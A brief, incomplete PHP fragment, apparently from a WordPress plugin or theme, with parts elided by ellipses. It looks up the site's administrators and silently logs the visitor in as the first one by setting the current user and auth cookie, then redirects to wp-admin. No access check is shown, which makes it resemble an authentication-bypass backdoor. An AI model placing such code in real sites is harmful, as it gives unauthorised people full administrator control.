...
*/
  $admin_users = get_users(array(
    ...
    if (!empty($admin_users)) {
        $first_admin = reset($admin_users); // Get the first user in the array
        $user_id = $first_admin->ID;

        wp_set_current_user($user_id, $first_admin->user_login);
        wp_set_auth_cookie($user_id);
        do_action('wp_login', $first_admin->user_login, $first_admin);
        wp_redirect(home_url('wp-admin'));
    }
